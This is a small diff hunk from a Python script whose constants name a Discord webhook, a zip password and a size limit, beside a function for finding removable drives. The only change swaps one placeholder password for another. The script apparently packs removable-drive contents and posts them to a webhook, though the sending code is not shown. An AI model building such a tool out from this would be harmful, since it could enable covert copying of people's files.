@@ -12,7 +12,7 @@ import math
 # Constants
 MAX_SIZE_MB = 1024  # Maximum zip file size (in MB)
 DISCORD_WEBHOOK = "DISCORD_WEBHOOK"  # Your Discord webhook URL here
-PASSWORD = "ZIP_PASSWORD"  # Password to protect the zip file
+PASSWORD = "PASSWORD"  # Password to protect the zip file
 
 def get_removable_drives():
     """
